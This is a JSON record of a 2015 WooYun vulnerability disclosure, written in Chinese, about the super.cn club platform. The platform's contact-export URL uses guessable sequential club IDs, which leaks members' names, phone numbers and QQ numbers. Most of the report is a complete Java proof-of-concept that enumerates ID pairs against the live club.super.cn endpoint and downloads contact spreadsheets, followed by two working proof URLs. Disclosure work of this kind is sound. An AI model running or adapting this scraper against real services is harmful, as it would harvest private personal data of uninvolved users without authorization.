{"id": 47182, "wybug_id": "wooyun-2015-0138205", "wybug_title": "超级课程表某主营业务逻辑缺陷导致全体用户真实姓名手机和QQ隐私泄露", "wybug_corp": "super.cn", "wybug_author": "dragonwing", "wybug_date": "2015-08-31 17:39", "wybug_open_date": "2015-09-05 17:40", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞", "用户信息泄露", "超级课程表"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-05：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 超级课程表某主营业务，泄露全体用户真实姓名和手机和QQ等隐私信息。 详细说明：  超级社团是超级课程表主营业务，截止至目前已有4万多个社团加入。\n\n主要功能之一就是：方便用户寻找社团内其他用户的联系方式，包括QQ和手机号码和短号，其中还包括用户的院系和社团名称和社团职位等信息，这些信息对于社团内部成员来说是公开的，但对于社团外的人来说，这便是隐私。进入超级社团后有一个大大的按钮——“导出通讯录”链接格式如下：\nhttp://club.super.cn/Excel/exportClubContacts.xls?clubId=&clubPeriodId=\n经简单研究发现clubId为社团id，clubPeriodId为社团周期id。当一个社团被新建时，clubId自增，clubPeriodId也自增。当一个社团被删除时，clubId自减，clubPeriodId不变。更多详细规则，就不在此阐述，直接上POC，以下是获取获取正确的clubId和clubPeriodId对应关系的代码（已避免盲目暴力破解）：\nimport java.io.BufferedReader;import java.io.BufferedWriter;import java.io.File;import java.io.FileNotFoundException;import java.io.InputStreamReader;import java.io.OutputStreamWriter;import java.net.CookieManager;import java.net.HttpURLConnection;import java.net.URL;import java.util.ArrayList;import java.util.List;import java.util.Scanner;public class SuperClubTryClubPeriodId {\tCookieManager ca = new CookieManager();\tString sessionID = \"\";\tint ClubPeriodId;\tint ClubId;\tint num;\tint tempClubId;\tint tempClubPeriodId;\tint tempNum;\tint tempWhetherRecord;\t\tpublic int getClubPeriodId() {\t\treturn ClubPeriodId;\t}\tpublic void setClubPeriodId(int ClubPeriodId) {\t\tthis.ClubPeriodId = ClubPeriodId;\t}\t\tpublic int getNum() {\t\treturn num;\t}\tpublic void setNum(int num) {\t\tthis.num = num;\t}\tpublic int getClubId() {\t\treturn ClubId;\t}\tpublic void setClubId(int ClubId) {\t\tthis.ClubId = ClubId;\t}\tpublic int gettempClubPeriodId() {\t\treturn tempClubPeriodId;\t}\tpublic void settempClubPeriodId(int tempClubPeriodId) {\t\tthis.tempClubPeriodId = tempClubPeriodId;\t}\t\t\t\t\t\t\tpublic static void main(String args[]){\t\tSuperClubTryClubPeriodId SCtryCP= new SuperClubTryClubPeriodId();\t\tSCtryCP.setNum(29);\t\tSCtryCP.setClubPeriodId(650);\t\tSCtryCP.settempClubPeriodId(SCtryCP.getClubPeriodId());\t\tObject[] ClubIdtemp=getClubIdTxt();\t\tfor (; SCtryCP.getNum() < ClubIdtemp.length; ) {\t\t\tSCtryCP.setClubId(chooseClubId(SCtryCP.getNum()));\t\t\tSCtryCP.crack(SCtryCP.getClubId(), SCtryCP.getClubPeriodId());\t\t}\t\t\t}\t\tpublic void crack(int ClubId,int ClubPeriodId){\t\tSuperClubTryClubPeriodId SCtryCP= new SuperClubTryClubPeriodId();\t    \tint count = 0;\t    \t\t    \tif (this.ClubPeriodId-this.tempClubPeriodId<100) {\t    \t\tif (this.tempWhetherRecord==0){\t    \t\t\tthis.tempNum=this.num;\t    \t\t\tthis.tempClubPeriodId=this.ClubPeriodId;\t    \t\t\tthis.tempWhetherRecord=1;\t    \t\t}\t    \t\t\t    \t\tString url=\"http://Club.super.cn/Excel/exportClubContacts.xls?clubId=\"+ClubId+\"&clubPeriodId=\"+ClubPeriodId;\t    \t\t\t\t\tif (judgeExists(url)==true){\t\t\t\tString EXCEL=\"\";\t\t\t\tEXCEL=SCtryCP.get(url, \"utf-8\");\t\t\t\tString key=\"Arial1\";\t\t\t    \tint index = 0;\t\t\t    \twhile((index=EXCEL.indexOf(key,index))!=-1){\t\t\t    \t\tindex = index+key.length();\t\t\t    \t\tcount++;\t\t\t    \t}\t\t\t    \tif (count==4) {\t\t\t    \t\tSystem.out.println(\"成功：ClubId:\"+ClubId+\"，\"+\"ClubPeriodId:\"+ClubPeriodId);\t\t\t    \t\tthis.num++;\t\t\t    \t\tthis.tempWhetherRecord=0;\t\t\t    \t} else if (count==5){\t\t\t    \t}\t\t    \t\tthis.ClubPeriodId++;\t\t\t    \t\t\t\t} else {\t\t    \t\tSystem.out.println(\"此ClubId:\"+ClubId+\"不存在通讯录数据\");\t\t\t\tthis.num++;\t\t\t}\t    \t\t\t    \t} else {\t    \t\tSystem.out.println(\"此ClubId:\"+ClubId+\"无规律需要暴力破解\");\t    \t\tthis.tempNum=this.tempNum+1;\t    \t\tthis.num=this.tempNum;\t    \t\tthis.tempClubPeriodId=this.tempClubPeriodId-50;\t    \t\tthis.ClubPeriodId=this.tempClubPeriodId;\t    \t}\t}\t\t\t\t\tpublic static int chooseClubId(int j){\t\tObject[] ClubIdtemp=getClubIdTxt();\t\tint ClubIdNum = 0;\t\t\t\ttry{\t\t\tClubIdNum=Integer.parseInt((String) ClubIdtemp[j]);\t\t}\t\tcatch (NumberFormatException e){\t\t}\t\treturn ClubIdNum;\t}\t\tpublic static Object[] getClubIdTxt(){\t\t\t\tScanner sc = null;\t\tObject[] temp = null;\t\ttry {\t\t\tsc = new Scanner(new File(\"F:/超级ClubId.txt\"));\t\t\tString str = null;\t\t\tList<String> list = new ArrayList<String>();\t\t\twhile (sc.hasNextLine()) {\t\t\t\tstr = sc.nextLine();\t\t\t\tlist.add(str);\t\t\t}\t\t\t\ttemp = list.toArray();\t\t\t\t\t}\t\t\t\tcatch (FileNotFoundException e) {\t\t}\t\tfinally {\t\t\tif(sc !=null)sc.close();\t\t}\t\treturn temp;\t}\t\t\tstatic boolean judgeExists(String URLName) {\t\ttry {\t\t\tHttpURLConnection.setFollowRedirects(false);\t\t\tHttpURLConnection con = (HttpURLConnection) new URL(URLName).openConnection();\t\t\tcon.setRequestMethod(\"GET\");\t\t\treturn (con.getResponseCode() == HttpURLConnection.HTTP_OK);\t\t} catch (Exception e) {\t\t\te.printStackTrace();\t\t\treturn false;\t\t}\t}\t\t\tpublic String get(String url, String charset) {\t\ttry {\t\t\tString key = \"\";\t\t\tString cookieVal = \"\";\t\t\tURL httpURL = new URL(url);\t\t\tHttpURLConnection http = (HttpURLConnection) httpURL\t\t\t\t\t.openConnection();\t\t\tif (!sessionID.equals(\"\")) {\t\t\t\thttp.setRequestProperty(\"Cookie\", sessionID);\t\t\t}\t\t\tfor (int i = 1; (key = http.getHeaderFieldKey(i)) != null; i++) {\t\t\t\tif (key.equalsIgnoreCase(\"set-cookie\")) {\t\t\t\t\tcookieVal = http.getHeaderField(i);\t\t\t\t\tcookieVal = cookieVal.substring(\t\t\t\t\t\t\t0,\t\t\t\t\t\t\tcookieVal.indexOf(\";\") > -1 ? cookieVal\t\t\t\t\t\t\t\t\t.indexOf(\";\") : cookieVal.length() - 1);\t\t\t\t\tsessionID = sessionID + cookieVal + \";\";\t\t\t\t}\t\t\t}\t\t\tBufferedReader br = new BufferedReader(new InputStreamReader(\t\t\t\t\thttp.getInputStream(), charset));\t\t\tStringBuilder sb = new StringBuilder();\t\t\tString temp = null;\t\t\twhile ((temp = br.readLine()) != null) {\t\t\t\tsb.append(temp);\t\t\t\tsb.append(\"\\n\");\t\t\t}\t\t\tbr.close();\t\t\treturn sb.toString();\t\t} catch (Exception e) {\t\t\te.printStackTrace();\t\t}\t\treturn null;\t}\n   漏洞证明：  http://club.super.cn/Excel/exportClubContacts.xls?clubId=28027&clubPeriodId=29029\n\nhttp://club.super.cn/Excel/exportClubContacts.xls?clubId=23784&clubPeriodId=24699\n\n   修复方案：  从clubId处就应该开始加密，防止暴力破解   版权声明：转载请注明来源 dragonwing@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-09-05 17:40 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}